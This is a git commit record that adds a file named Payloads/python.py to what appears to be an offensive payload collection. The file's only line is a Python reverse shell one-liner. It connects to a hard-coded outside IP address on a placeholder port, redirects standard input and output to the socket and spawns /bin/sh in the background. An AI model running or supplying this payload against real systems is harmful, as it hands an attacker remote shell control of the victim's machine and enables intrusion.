e1769f654752d35ee337868e67bfc5a211e5e3cd
Tech EFX Tv <59799893+efxtv@users.noreply.github.com>
2021-10-03 13:38:32 +0530

    Create python.py

---
+++ Payloads/python.py
@@ -0,0 +1,1 @@
+export RHOST="193.161.193.99";export RPORT=POOOO;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")' &
